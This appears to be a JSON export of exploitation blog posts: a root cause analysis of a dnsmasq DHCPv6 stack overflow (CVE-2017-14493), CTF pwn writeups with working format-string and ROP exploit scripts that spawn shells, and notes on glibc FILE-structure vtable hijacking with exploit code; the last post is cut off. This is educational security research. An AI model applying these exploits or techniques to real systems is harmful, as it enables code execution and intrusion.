[
  
  {
    "title": "From CTFs to Real-World Exploitation: Root Cause Analysis of CVE-2017-14493 in dnsmasq",
    "url": "/post/RCA-CVE-2017-14493/",
    "categories": "research",
    "tags": "linux-userland",
    "date": "2026-02-19 00:00:00 +0200",
    "content": "[CVE-2017-14493 ] Root Cause Analysis on vulnerable dnsmasq software.  This is my first step of moving from CTFs to Real World Vulnerabilities. My goal  is to move from exploiting CTFs to real world software such has dnsmasq and eventually both the linux and andriod kernel.  Lab Setup.  I will be running the vulnerable software on a kali virtual machine using virtualbox, and i will use my ubuntu machine as the attacker machine.  First lets download the vulnerable software version ( &lt; 2.78)   wget https://dnsmasq.org/dnsmasq-2.77.tar.xz   Then i first compiled it with out security mitigations.  make CFLAGS=\"-O0 -g -fno-stack-protector -z execstack -no-pie -Wno-error=incompatible-pointer-types -Wno-error=deprecated-non-prototype -fpermissive\" LDFLAGS=\"-z execstack -no-pie\"   Then I set up my network interfaces on both machines so that i can use a IPv6 address (since the vulnerabilities are in DHCPv6)  Kali: sudo ip -6 addr add 2001:db8::1/64 dev eth0  Ubuntu: sudo ip -6 addr add 2001:db8::1/64 dev wlp4s0   So To find the where the vulnerable code/code path is I will use a debugger (gdb with gef extension).  So lets start with CVE-2017-14493. CVE-2017-14493  CVE Description: Stack-based buffer overflow in dnsmasq before 2.78 allows remote attackers to cause a denial of service (crash) or execute arbitrary code via a crafted DHCPv6 request.  To find where the vulnerability is lets run they program while its attached to a debugger and run the PoC and analyse it from there.  To make this easier I copied the necessary source code into the folder dnsmasq-2.77/src and then I used GDB script with the following commands.  directory dnsmasq-2.77/src/ set follow-exec-mode new set breakpoint pending on run -d -i wlp4s0 --dhcp-range=2001:db8::10,2001:db8::ae,64 --enable-ra   As we find interesting code paths we will use this gdb script to but breakpoints in the source code.  Then run gdb with this script.  sudo gdb ./dnsmasq -x ./gdb_cmds     In the attacker machine run the PoC  ./poc.py 2001:db8::1 547 #./poc.py &lt;ipv6 addr&gt; &lt;port&gt;    As we can see that we got a segfault in the dhcp6_reply().  unsigned short  dhcp6_reply(struct dhcp_context *context, int interface, char *iface_name,         struct in6_addr *fallback, struct in6_addr *ll_addr, struct in6_addr *ula_addr,         size_t sz, struct in6_addr *client_addr, time_t now) {         struct dhcp_vendor *vendor;         int msg_type;         struct state state;         if (sz &lt;= 4) return 0;         msg_type = *((unsigned char *)daemon-&gt;dhcp_packet.iov_base);         /* Mark these so we only match each at most once, to avoid tangled linked lists */         for (vendor = daemon-&gt;dhcp_vendors; vendor; vendor = vendor-&gt;next)                 vendor-&gt;netid.next = &amp;vendor-&gt;netid;                  reset_counter();         state.context = context;         state.interface = interface;         state.iface_name = iface_name;         state.fallback = fallback;         state.ll_addr = ll_addr;         state.ula_addr = ula_addr;         state.mac_len = 0;         state.tags = NULL;         state.link_address = NULL;          if (dhcp6_maybe_relay(&amp;state, daemon-&gt;dhcp_packet.iov_base, sz, client_addr,                 N6_IS_ADDR_MULTICAST(client_addr), now))                 return msg_type == DHCP6RELAYFORW ? DHCPV6_SERVER_PORT : DHCPV6_CLIENT_PORT;         return 0; }   When looking at function, there is nothing really interesting, so my first thought was that there vulnerability is in another function but affects the stack of this function. The only function that has a argument that resides in the dhcp6_reply is dhcp6_maybe_relay and the variable name is state.  Here is the state struct:     struct state { \tunsigned char *clid; \tint clid_len, iaid, ia_type, interface, hostname_auth, lease_allocate; \tchar *client_hostname, *hostname, *domain, *send_domain; \tstruct dhcp_context *context; \tstruct in6_addr *link_address, *fallback, *ll_addr, *ula_addr; \tunsigned int xid, fqdn_flags; \tchar *iface_name; \tvoid *packet_options, *end; \tstruct dhcp_netid *tags, *context_tags; \tunsigned char mac[DHCP_CHADDR_MAX]; \tunsigned int mac_len, mac_type; #ifdef OPTION6_PREFIX_CLASS \tstruct prefix_class *send_prefix_class; #endif };   So now lets look at  dhcp6_maybe_reply() and only focus on state. Here is the whole function :   static int dhcp6_maybe_relay(struct state *state, void *inbuff, size_t sz,  \t\t\t     struct in6_addr *client_addr, int is_unicast, time_t now) {   void *end = inbuff + sz;   void *opts = inbuff + 34;   int msg_type = *((unsigned char *)inbuff);   unsigned char *outmsgtypep;   void *opt;   struct dhcp_vendor *vendor;    /* if not an encapsulated relayed message, just do the stuff */   if (msg_type != DHCP6RELAYFORW)     {       /* if link_address != NULL if points to the link address field of the  \t innermost nested RELAYFORW message, which is where we find the \t address of the network on which we can allocate an address. \t Recalculate the available contexts using that information.         link_address == NULL means there's no relay in use, so we try and find the client's        MAC address from the local ND cache. */              if (!state-&gt;link_address) \tget_client_mac(client_addr, state-&gt;interface, state-&gt;mac, &amp;state-&gt;mac_len, &amp;state-&gt;mac_type, now);       else \t{ \t  struct dhcp_context *c; \t  state-&gt;context = NULL; \t    \t  if (!IN6_IS_ADDR_LOOPBACK(state-&gt;link_address) &amp;&amp; \t      !IN6_IS_ADDR_LINKLOCAL(state-&gt;link_address) &amp;&amp; \t      !IN6_IS_ADDR_MULTICAST(state-&gt;link_address)) \t    for (c = daemon-&gt;dhcp6; c; c = c-&gt;next) \t      if ((c-&gt;flags &amp; CONTEXT_DHCP) &amp;&amp; \t\t  !(c-&gt;flags &amp; (CONTEXT_TEMPLATE | CONTEXT_OLD)) &amp;&amp; \t\t  is_same_net6(state-&gt;link_address, &amp;c-&gt;start6, c-&gt;prefix) &amp;&amp; \t\t  is_same_net6(state-&gt;link_address, &amp;c-&gt;end6, c-&gt;prefix)) \t\t{ \t\t  c-&gt;preferred = c-&gt;valid = 0xffffffff; \t\t  c-&gt;current = state-&gt;context; \t\t  state-&gt;context = c; \t\t} \t   \t  if (!state-&gt;context) \t    { \t      inet_ntop(AF_INET6, state-&gt;link_address, daemon-&gt;addrbuff, ADDRSTRLEN);  \t      my_syslog(MS_DHCP | LOG_WARNING,  \t\t\t_(\"no address range available for DHCPv6 request from relay at %s\"), \t\t\tdaemon-&gt;addrbuff); \t      return 0; \t    } \t} \t         if (!state-&gt;context) \t{ \t  my_syslog(MS_DHCP | LOG_WARNING,  \t\t    _(\"no address range available for DHCPv6 request via %s\"), state-&gt;iface_name); \t  return 0; \t}        return dhcp6_no_relay(state, msg_type, inbuff, sz, is_unicast, now);     }    /* must have at least msg_type+hopcount+link_address+peer_address+minimal size option      which is               1   +    1   +    16      +     16     + 2 + 2 = 38 */   if (sz &lt; 38)     return 0;      /* copy header stuff into reply message and set type to reply */   if (!(outmsgtypep = put_opt6(inbuff, 34)))     return 0;   *outmsgtypep = DHCP6RELAYREPL;    /* look for relay options and set tags if found. */   for (vendor = daemon-&gt;dhcp_vendors; vendor; vendor = vendor-&gt;next)     {       int mopt;              if (vendor-&gt;match_type == MATCH_SUBSCRIBER) \tmopt = OPTION6_SUBSCRIBER_ID;       else if (vendor-&gt;match_type == MATCH_REMOTE) \tmopt = OPTION6_REMOTE_ID;        else \tcontinue;        if ((opt = opt6_find(opts, end, mopt, 1)) &amp;&amp; \t  vendor-&gt;len == opt6_len(opt) &amp;&amp; \t  memcmp(vendor-&gt;data, opt6_ptr(opt, 0), vendor-&gt;len) == 0 &amp;&amp; \t  vendor-&gt;netid.next != &amp;vendor-&gt;netid) \t{ \t  vendor-&gt;netid.next = state-&gt;tags; \t  state-&gt;tags = &amp;vendor-&gt;netid; \t  break; \t}     }      /* RFC-6939 */   if ((opt = opt6_find(opts, end, OPTION6_CLIENT_MAC, 3)))     {       state-&gt;mac_type = opt6_uint(opt, 0, 2);       state-&gt;mac_len = opt6_len(opt) - 2;       memcpy(&amp;state-&gt;mac[0], opt6_ptr(opt, 2), state-&gt;mac_len);     }      for (opt = opts; opt; opt = opt6_next(opt, end))     {       int o = new_opt6(opt6_type(opt));       if (opt6_type(opt) == OPTION6_RELAY_MSG) \t{ \t  struct in6_addr align; \t  /* the packet data is unaligned, copy to aligned storage */ \t  memcpy(&amp;align, inbuff + 2, IN6ADDRSZ);  \t  state-&gt;link_address = &amp;align; \t  /* zero is_unicast since that is now known to refer to the  \t     relayed packet, not the original sent by the client */ \t  if (!dhcp6_maybe_relay(state, opt6_ptr(opt, 0), opt6_len(opt), client_addr, 0, now)) \t    return 0; \t}       else if (opt6_type(opt) != OPTION6_CLIENT_MAC) \tput_opt6(opt6_ptr(opt, 0), opt6_len(opt));       end_opt6(o);\t         }      return 1; }   Here is where the vulnerability happens:  if ((opt = opt6_find(opts, end, OPTION6_CLIENT_MAC, 3))) { \tstate-&gt;mac_type = opt6_uint(opt, 0, 2); \t\t\tstate-&gt;mac_len = opt6_len(opt) - 2; \tmemcpy(&amp;state-&gt;mac[0], opt6_ptr(opt, 2), state-&gt;mac_len); }   User controlled data is copied to state-&gt;mac[0] using a user controlled size which is not validated by the program.  Lets check the size of state-&gt;mac. Has we have seen from the state struct.  unsigned char mac[DHCP_CHADDR_MAX];   state-&gt;mac is a character buffer, DHCP_CHADDR_MAX is defined with size 16.  To confirm this vulnerability lets use a debugger to check the size of state-&gt;mac_len when memcpy() is called.  This vulnerability happens in dhcp6_maybe_relay() but it corrupts stack memory in dhcp6_relay because state is stored in that function.  Here is the exact corruption layout:  nsigned char mac[DHCP_CHADDR_MAX]; \tunsigned int mac_len, mac_type; #ifdef OPTION6_PREFIX_CLASS \tstruct prefix_class *send_prefix_class; #endif  state.mac[16] state.mac_len  state.mac_type ... Stack Canary : at offset 42 saved RBP saved RIP  The Patch  Through source patch diffing I found out how they patched this vulnerability.  if ((opt = opt6_find(opts, end, OPTION6_CLIENT_MAC, 3))) { \t/* Patch */ \tif (opt6_len(opt) - 2 &gt; DHCP_CHADDR_MAX) { \treturn 0; \t} \t/* End of patch */ \tstate-&gt;mac_type = opt6_uint(opt, 0, 2); \tstate-&gt;mac_len = opt6_len(opt) - 2; \tmemcpy(&amp;state-&gt;mac[0], opt6_ptr(opt, 2), state-&gt;mac_len); }   I check was added to ensure that the data copied into the state-&gt;mac buffer was less than DHCP_CHADDR_MAX. That is simply the patch.  To exploit this vulnerability (Later blog post) I will need a CVE-2017-14494 which is a information leak vulnerability.  Research  Status  The root cause analysis for CVE-2017-14493 has been completed, including patch diffing and vulnerable code path tracing.  Ongoing work focuses on:    Reliable heap layout control   Leveraging CVE-2017-14494 for information disclosure   Evaluating exploitability under modern glibc and compiler mitigations   Writing a fully reliable exploit   Updates will follow as the research progresses."
  },
  
  {
    "title": "Pascal CTF - yetanothernotetaker",
    "url": "/post/pascalCTF-yetanothernotetaker/",
    "categories": "writeup, pwn",
    "tags": "",
    "date": "2026-02-01 00:00:00 +0200",
    "content": "YET ANOTHER NOTE TAKER  About the binary  The binary  t1b4n3@debian:~/ctf/pascalctf/yetanothernotetaker/challenge$ file notetaker notetaker: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./libs/ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=768a7bc2d2918ceb196b57bfa9528681820eae43, not stripped   The binary is a elf 64 bit executable, and it is not stripped which makes reversing a lot easier.  t1b4n3@debian:~/ctf/pascalctf/yetanothernotetaker/challenge$ pwn checksec notetaker [*] '/home/t1b4n3/ctf/pascalctf/yetanothernotetaker/challenge/notetaker'     Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      No PIE (0x400000)     RPATH:    b'./libs/'   All mitigations are turned on except PIE  Reversing and Vulnerability Discovery  main() int32_t main(int32_t argc, char** argv, char** envp) {     void* fsbase;     int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);     init();     char notes[0x108];     memset(&amp;notes, 0, 0x100);     int32_t i;          do     {         menu();         char* cmd = malloc(0x10);         memset(cmd, 0, 0x10);         fgets(cmd, 0x10, stdin);         __isoc99_sscanf(cmd, \"%d\", &amp;i);         free(cmd);         int32_t choice = i;                  if (choice == 2)         {             printf(\"Enter the note: \");             read(0, &amp;notes, 0x100);             notes[strcspn(&amp;notes, u\"\\n…\")] = 0;         }         else if (choice == 3)         {             memset(&amp;notes, 0, 0x100);             puts(\"Note cleared.\");         }         else if (choice == 1)         {             printf(&amp;notes);             putchar(0xa);         }                  if (i &lt;= 0)             break;     } while (i &lt;= 4);          if (rax == *(uint64_t*)((char*)fsbase + 0x28))         return 0;          __stack_chk_fail();     /* no return */ }   This function defines a note buffer that is 0x108 which will store our note. The program uses a heap chunk to get the user’s choice (This will be important later).  Choices  ./notetaker  1. Read note 2. Write note 3. Clear note 4. Exit &gt;       Option 1 prints the note to stdout and has a FORMAT STRING vulnerability.   Option 2 Gets Input from stdin   Option 3 Clears the note buffer   Exploitation.  Strategy: Use the format string read vulnerability to leak a libc address and calculate the offset of the libc base address. Then use the format string write vulnerability again to overwrite the free hook and free a chunk that has the string /bin/sh.  Lets use the format string read to leak a libc address.    The first address that is leaked is: 0x7ffff7bc4b28, we can use this to get the libc base address.    libc = 0x00007ffff7800000 leak = 0x7ffff7bc4b28 print(hex(leak - libc)) # 0x3c4b28   n.write(b\"%p\") leak = n.read() leak = int(leak, 16) libc.address = leak - 0x3c4b28   Now we can use the format string vulnerability to overwrite the free hook (libc.sym.__free_hook).  format_str = 8  # fmtstr_payload(offset, {where:what})  p = fmtstr_payload(format_str, {libc.sym.__free_hook:libc.sym.system}) #   # Trigger vuln n.write(p) n.read()   Now that we have overwritten the free hook with system()    So to execute any command we just have place the command inside a heap chunk than free it.  char* cmd = malloc(0x10); memset(cmd, 0, 0x10); fgets(cmd, 0x10, stdin); __isoc99_sscanf(cmd, \"%d\", &amp;i); free(cmd);   So we just have to enter out cmd when the program tries to get a option.  sla(b\"&gt; \", b\"/bin/sh\")   This will now pop a shell.    class NoteTaker:     def __init__(self):         pass      def read(self):         sla(b\"&gt; \", b\"1\")         data = rl()         return data      def write(self, data):         sla(b\"&gt; \", b\"2\")         sla(b\"Enter the note: \", data)      def clear(self):         sla(b\"&gt; \", b\"3\")    def exploit():     #####################################################################      ######################## EXPLOIT CODE ###############################     #####################################################################     n = NoteTaker()     n.write(b\"%p\")     leak = n.read()      leak = int(leak, 16)     libc.address = leak - 0x3c4b28      print_leak(\"libc\", libc.address)          format_str = 8      p = fmtstr_payload(format_str, {libc.sym.__free_hook:libc.sym.system})          n.write(p)     n.read()     sla(b\"&gt; \", b\"/bin/sh\")    FULL SCRIPT"
  },
  
  {
    "title": "Introduction to File Structure Exploitation",
    "url": "/post/file-structure-exploitaton/",
    "categories": "Notes, File-Struct-Exploitation, FSOP",
    "tags": "File-Struct-Exploits, fsop",
    "date": "2025-12-23 00:00:00 +0200",
    "content": "File Structure Exploitation is a binary exploitation technique that uses GLIBC file streams structures to gain code execution. It has become popular since pointers like __malloc_hook, __free_hook, etc. have been removed from GLIBC 2.34.  I was searching the internet on another way to get code execution of latest GLIBC versions, when i encountered it.  File Structure Exploitation  File structure exploitation is an advanced binary exploitation technique that leverages memory corruption vulnerabilities  to overwrite a FILE pointer and manipulate the internal data structure used by standard I/O libraries to mange file streams. Overview of the FILE Structure  In GLIBC the file structures were introduced to improve a program’s I/O performances through the use of buffering.  The file structure is a important component of that standard I/O library in C, representing a file stream.  struct _IO_FILE {   int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */   /* The following pointers correspond to the C++ streambuf protocol. */   char *_IO_read_ptr;\t/* Current read pointer */   char *_IO_read_end;\t/* End of get area. */   char *_IO_read_base;\t/* Start of putback+get area. */   char *_IO_write_base;\t/* Start of put area. */   char *_IO_write_ptr;\t/* Current put pointer. */   char *_IO_write_end;\t/* End of put area. */   char *_IO_buf_base;\t/* Start of reserve area. */   char *_IO_buf_end;\t/* End of reserve area. */   /* The following fields are used to support backing up and undo. */   char *_IO_save_base; /* Pointer to start of non-current get area. */   char *_IO_backup_base;  /* Pointer to first valid character of backup area */   char *_IO_save_end; /* Pointer to end of non-current get area. */    struct _IO_marker *_markers;   struct _IO_FILE *_chain;   int _fileno;   int _flags2;   __off_t _old_offset; /* This used to be _offset but it's too small.  */   /* 1+column number of pbase(); 0 is unknown. */   unsigned short _cur_column;   signed char _vtable_offset;   char _shortbuf[1];    _IO_lock_t *_lock;    __off64_t _offset;   /* Wide character stream stuff.  */   struct _IO_codecvt *_codecvt;   struct _IO_wide_data *_wide_data;   struct _IO_FILE *_freeres_list;   void *_freeres_buf;   size_t __pad5;   int _mode;   /* Make sure we don't get into trouble again.  */   char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)]; };   Opened file streams are joined in a singly linked list via the _chain field. This allows GLIBC to easily close them all on exit. The head of the linked list is _IO_list_all. GLIBC always has 3 file streams open which are stdin,stdout and stderr.  _flags is used to record the attribute of File stream such as read only, write, append and so on. It also shows the status of the file buffering status.  Stream buffer pointers are divided into three parts:    Read buffer :  _IO_read_ptr, _IO_read_end, _IO_read_base   Write buffer :_IO_write_ptr, _IO_write_end, _IO_write_base   Reserve buffer: _IO_buf_base, _IO_buf_end   Where the pointers point to:    **ptr points at the current buffer position.   **base points to the beginning of the buffer.   **end points to the end of the buffer.   _fileno is a file descriptor from the file which you open, it returns from the system call open.  The _lock pointer is used for threaded file access.  The _wide_data field points to a similar structure used to handle wide strings.  /* Extra data for wide character streams.  */ struct _IO_wide_data {   wchar_t *_IO_read_ptr;\t/* Current read pointer */   wchar_t *_IO_read_end;\t/* End of get area. */   wchar_t *_IO_read_base;\t/* Start of putback+get area. */   wchar_t *_IO_write_base;\t/* Start of put area. */   wchar_t *_IO_write_ptr;\t/* Current put pointer. */   wchar_t *_IO_write_end;\t/* End of put area. */   wchar_t *_IO_buf_base;\t/* Start of reserve area. */   wchar_t *_IO_buf_end;\t\t/* End of reserve area. */   /* The following fields are used to support backing up and undo. */   wchar_t *_IO_save_base;\t/* Pointer to start of non-current get area. */   wchar_t *_IO_backup_base;\t/* Pointer to first valid character of \t\t\t\t   backup area */   wchar_t *_IO_save_end;\t/* Pointer to end of non-current get area. */    __mbstate_t _IO_state;   __mbstate_t _IO_last_state;   struct _IO_codecvt _codecvt;    wchar_t _shortbuf[1];    const struct _IO_jump_t *_wide_vtable; };   Then there is _IO_FILE_plus which is an extension of the FILE structure. It adds the virtual function table also called vtable.  /* We always allocate an extra word following an _IO_FILE.    This contains a pointer to the function jump table used.    This is for compatibility with C++ streambuf; the word can    be used to smash to a pointer to a virtual function table. */  struct _IO_FILE_plus {   struct _IO_FILE file;   const struct _IO_jump_t *vtable; };    Default file streams (stdin, stdout, stderr) use this extended version. The purpose of using the extended version _IO_FILE_plus is to make IO operations faster by having the vtable.  To view this structure in GDB, we can use the ptype /o command.    The vtable field is a array of pointers to the helper functions during executing the IO operation. It is commonly found in C++ binaries. vtables allows for dynamic function resolution at runtime.  The data type for the vtable is _IO_jump_t which stores the pointer to the needed IO helper methods.  struct _IO_jump_t {     JUMP_FIELD(size_t, __dummy);     JUMP_FIELD(size_t, __dummy2);     JUMP_FIELD(_IO_finish_t, __finish);     JUMP_FIELD(_IO_overflow_t, __overflow);     JUMP_FIELD(_IO_underflow_t, __underflow);     JUMP_FIELD(_IO_underflow_t, __uflow);     JUMP_FIELD(_IO_pbackfail_t, __pbackfail);     /* showmany */     JUMP_FIELD(_IO_xsputn_t, __xsputn);     JUMP_FIELD(_IO_xsgetn_t, __xsgetn);     JUMP_FIELD(_IO_seekoff_t, __seekoff);     JUMP_FIELD(_IO_seekpos_t, __seekpos);     JUMP_FIELD(_IO_setbuf_t, __setbuf);     JUMP_FIELD(_IO_sync_t, __sync);     JUMP_FIELD(_IO_doallocate_t, __doallocate);     JUMP_FIELD(_IO_read_t, __read);     JUMP_FIELD(_IO_write_t, __write);     JUMP_FIELD(_IO_seek_t, __seek);     JUMP_FIELD(_IO_close_t, __close);     JUMP_FIELD(_IO_stat_t, __stat);     JUMP_FIELD(_IO_showmanyc_t, __showmanyc);     JUMP_FIELD(_IO_imbue_t, __imbue); };     Exploitation  This technique can be used to read and write arbitrary memory through the use of the _IO_read_base and _IO_write_base pointers. This technique can also lead to arbitrary code execution through vtable highjacking.  The pwntools library provides a  Arbitrary Write (Reading Data In)  Requirements    Set flag value   set read_ptr = read_end   set buf_base to address to write   set buf_end to address to write + length (end point)   buf_end - buf_base &gt;= number of bytes to read   We use fread to read bytes from stdin to a buffer  FILE *fp = fopen(\"./flag.txt\", \"r\"); read(0, fp, 0x100); char buf[0x100]; fread(buf, 1, 10, fp);   Pwntools addr = 0xdeadbeef # address to write size = 0x10 # must be larger than bytes read on `fread` fp = FileStructure() payload = fp.read(addr, size)   Arbitrary Read (Writing Data Out)  Requirements    set flag value   set write_base to memory to write   set write_ptr to address to write+length   set read_end = write_base   buf_end - buf_base &gt;= number of bytes to write   We use the fwrite function to write a buffer to stdout  FILE *fp = fopen(\"file\", \"w\"); char buf[0x100]; fwrite(buf, 1, 40, fp);   addr = 0xdeadbeef # address to read size = 0x10 # must be larger than bytes written on `fwrite` fp = FileStructure() payload = fp.write(addr, size)   vtable hijacking  Protections  Before looking at how to exploit this  The function _IO_validate_vtable() was added on GLIBC version 2.34 and does a couple of checks on the vtable:     It checks whether the vtable in a section of memory where default vtables exist in libc. __libc_IO_vtables   /* Perform vtable pointer validation.  If validation fails, terminate    the process.  */ static inline const struct _IO_jump_t * IO_validate_vtable (const struct _IO_jump_t *vtable) {   /* Fast path: The vtable pointer is within the __libc_IO_vtables      section.  */   uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;   uintptr_t ptr = (uintptr_t) vtable;   uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;   if (__glibc_unlikely (offset &gt;= section_length))     /* The vtable pointer is not in the expected section.  Use the        slow path, which will terminate the process if necessary.  */     _IO_vtable_check ();   return vtable; }           If it fails the check, it will run _IO_vtable_check() where it will compare the value of &amp;IO_accept_foreign_vtables to that of &amp;_IO_vtable_check, and will proceed if it is correct, otherwise it aborts.           This can be bypassed easily, because instead of replacing the vtable of _IO_FILE how about we replace the vtable of _IO_wide_data which is not checked through the _IO_validate_vtable().            Instead of replacing fp-&gt;vtable we replace fp-&gt;_wide_data-&gt;_wide_vtable which does not go through the same checks as the other one.       We can make GLIBC use fp-&gt;_wide_data-&gt;_wide_vtable by pointing fp-&gt;vtable to vtable structures that have special encodings like_IO_wfile_overflow.       Get arbitrary code exection.           Exploit  the  vtable is full of function pointers which are needed for object oriented programming, if you can overwrite a function pointer inside the vtable of a file stream then trigger that function you can control the instruction pointer.  Create our own fake vtable, it can be placed anywhere. The place desired execution address at correct offset and then overwrite the vtable pointer in the _IO_File struct to point to our fake vtable.  _IO_lock_t pointer is used in multi-threaded programs to prevent race conditions. An exploit must set _IO_lock_t to point to:    writable location   with value NULL   Overwrite one of the functions in  file._wide_data._wide_vtable that will be called.  If we modify the vtable pointer to something like _IO_wXXXX_jumps, the GLIBC considers it as the wide-character stream and triggers _IO_wfile_overflow.  If we can make _wide_data point to our fake _wide_data IO_FILE_plus struct, which then has a _wide_vtable pointing to our exploit_vtable  wide_data also contains its own vtable, const struct _IO_jump_t *_wide_vtable;  Usage    Setup exploit_vtable a fake vtable   setup file.wide_data-&gt;vtable pointing to the custom exploit_vtable.   Overrides FILE.vtable such that IO_wfile_overflow gets called.   IO_wfile_overflow then calls do_allocbuf   do_allocbuf then calls file.wide_data-&gt;_wide_vtable.   fwrite -&gt; _IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; &lt;target addr&gt; (win)  When space is limited, structs can be overlapped as long as the offsets accessed return reasonable values.  glibc_2.36  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt;  void win() { \tputs(\"You WIN\"); \tsystem(\"/bin/sh\"); } int main() { \tsetbuf(stdout, NULL); \tsetbuf(stdin, NULL); \tsetbuf(stderr, NULL); \t \tprintf(\"win @ %p\\nputs @ %p\\n\", win, puts);  \tFILE *fp = fopen(\"/dev/null\", \"w\");  \tchar buf[0x1000]; \tprintf(\"reading into buf @ %p\\n\", buf); \tread(0, buf, 0x1000); \tprintf(\"reading into fp: \"); \tread(0, fp, 0x1000);  \tputs(\"calling fwrite\"); \tfwrite(buf, 1, 10, fp); \texit(0); }   exploit  def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t##################################################################### \tru(b\"@ \") \twin = int(rl(), 16) \tru(b\"@ \") \tputs = int(rl(), 16) \tlibc.address = 0x00007ffff7dc3000#puts - libc.sym['puts'] \t \tru(b\"@ \") \tbuf = int(rl(), 16)  \tprint_leak(\"win\", win) \tprint_leak(\"puts\", puts) \tprint_leak(\"libc base addr\", libc.address) \tprint_leak(\"stack buf\", buf)  \t\texploit_vtable = p64(0)*13 + p64(win) \t\twide_data = p64(0)*0x1c + p64(buf+0xe8) \t\"\"\" \twide_data { \t... \t_wide_vtable = wide_data+0xe0; (exploit_vtable) \t} \t \texploit_vtable { \t...  \twin \t} \t\"\"\" \tsl(wide_data + exploit_vtable) \tfp  = FileStructure(null = buf) \tfp.vtable = libc.sym._IO_wfile_jumps # must be within __libc_IO_vtables \tfp._wide_data = buf \tsla(b\"fp: \", bytes(fp))    When a program does not have any FILE IO operations File Structure exploitation can be still used.     _IO_list_all Highjacking: By overwriting the _IO_list_all with a pointer to a fake _IO_FILE_plus structure, the next I/O operation will trigger this fake structure to be used, giving control over to vtable.            To trigger the next I/O operation you will need to call exit() so that _IO_flush_lock the GLIBC will try to cleanup and use these             Different Exploitation Techniques Using File Structure Exploitation  References     file struct attack   https://niftic.ca/posts/fsop/   angry-fsop"
  },
  
  {
    "title": "NexHunt CTF 2025",
    "url": "/post/nexhunt-ctf/",
    "categories": "writeup, pwn",
    "tags": "",
    "date": "2025-12-14 00:00:00 +0200",
    "content": "I was looking for some CTFs to play during the weekend then I saw that  NexHunt CTF had a few hours left so I joined the CTF with about 3 hours left until the CTF ends. I was only able to solve 2 pwn challenges during those hours. Archive Keeper    About The binary   rabin2 -I ./chall arch     x86 baddr    0x400000 binsz    14182 bintype  elf bits     64 canary   false injprot  false class    ELF64 compiler GCC: (Debian 14.2.0-19) 14.2.0 crypto   false endian   little havecode true intrp    /lib64/ld-linux-x86-64.so.2 laddr    0x0 lang     c linenum  true lsyms    true machine  AMD x86-64 architecture nx       true os       linux pic      false relocs   true relro    partial rpath    NONE sanitize false static   false stripped false subsys   linux va       true   IT is a x86 64 bit elf binary and only the NX security mitgation is enabled.  Reversing and Vulnerability Discovery  This is a simple binary and the only interesting function is vuln() .  ssize_t vuln() {     puts(\"Welcome to the Archive. Enter yo…\");     void buf;     return read(0, &amp;buf, 0xc8); }   There is a stack buffer overflow in the function.  Exploitation  The first step would be to find the padding to the return address.  I found that the padding from the buffer to the return address is 72  Exploitation Strategy  Since NX is enabled, ROP must be used to bypass it.  A two-stage ROP attack (ret2plt):          Stage 1: Libc Leak - Overwrite return address with ROP chain that leaks a libc address. This can be done by calling a function like puts() with a GOT entry. The ROP chain should then return to the main function to allow for the second exploit.           Stage 2: Pop a shell - Use leaked libc to calculate address of system() and the string /bin/sh. Overwrite the return address with ROP chain that calls system(\"/bin/sh\"), granting a shell.      Stage 1 : Libc Address Leak  payload_stage1 = flat( \tcyclic(72), # padding \trop.rdi.addresss, # pop rdi, ret gadget \telf.got.puts, # puts@got \telf.plt.puts, # puts@plt \telf.sym.main, # return to main for stage 2 )   This payload will leak the address of puts@GOT and we can use that to get the libc base address  libc.address = leak - libc.sym.puts   Now we can use that to find the address of system() and /bin/sh Stage 2 : Popping a shell  payload_stage2 = flat( \tcyclic(72), # padding \trop.ret.address, # for 16 bytes alignment \trop.rdi.address, #  \tnext(libc.search(b\"/bin/sh\")), # addr of /bin/sh \tlibc.sym.system, # system() )   This ROP chain executes system(\"/bin/sh\"), which spawns a shell.    The full exploit :  def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t##################################################################### \t \tpop_rdi = rop.rdi.address \toffset = 64 + 8 # padding \tpayload_stage2 = flat( \t\tcyclic(offset), \t\tpop_rdi, elf.got.puts, \t\telf.plt.puts, \t\telf.sym.main \t)  \tsla(b\"Enter your data:\\n\", payload_stage1) \tdata = rl() # recv leak \tdata = data.rstrip(b\"\\r\\n\") \tleak = u64(data.ljust(8, b\"\\x00\")) \tprint_leak(\"puts\", leak) \tlibc.address = leak - libc.sym.puts \tprint_leak(\"libc base\", libc.address)  \tpayload_stage2 = flat( \t\tcyclic(offset), \t\trop.ret.address, \t\tpop_rdi, next(libc.search(b\"/bin/sh\")), \t\tlibc.sym.system \t)  \tsla(b\"Enter your data:\\n\", payload_stage2)    FULL EXPLOIT  Ghost Note    About the binary   rabin2 -I ./chall arch     x86 baddr    0x0 binsz    15529 bintype  elf bits     64 canary   true injprot  false class    ELF64 compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0 crypto   false endian   little havecode true intrp    /lib64/ld-linux-x86-64.so.2 laddr    0x0 lang     c linenum  true lsyms    true machine  AMD x86-64 architecture nx       true os       linux pic      true relocs   true relro    full rpath    NONE sanitize false static   false stripped false subsys   linux va       true   A x86-64 binary with all mitigations turned on.  ./ld-linux-x86-64.so.2 ./libc.so.6  GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.17) stable release version 2.31. Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 9.4.0. libc ABIs: UNIQUE IFUNC ABSOLUTE For bug reporting instructions, please see: &lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.   This challenge uses GLIBC 2.31.  When we run the binary it show us a menu.  1. Add Note 2. Delete Note 3. Show Note 4. Edit Note 5. Exit &gt;   Reversing and Vulnerability Discovering  Lets take a look at the main function  int32_t main(int32_t argc, char** argv, char** envp) {     void* fsbase;     int64_t var_10 = 